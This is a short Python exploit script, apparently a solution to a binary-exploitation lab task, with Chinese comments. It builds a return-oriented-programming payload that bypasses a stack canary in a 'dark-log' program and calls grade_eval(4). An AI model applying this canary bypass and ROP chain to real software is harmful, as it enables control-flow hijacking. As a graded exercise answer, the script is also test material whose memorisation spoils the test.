#!/usr/bin/env python3
"""Task 4: 绕过 Canary，在 dark-log 中调用 grade_eval(4)"""
import struct
import sys

GRADE   = 0x401677   # grade_eval
POP_RDI = 0x4018A3   # pop rdi; ret
DEST    = 160        # memcpy 目标 = expression+128+160 = saved rbp

chain  = b"B" * 8
chain += struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE)

payload  = chain
payload += b"C" * (256 - len(payload))
payload += struct.pack("<I", DEST)

sys.stdout.buffer.write(payload + b"\n")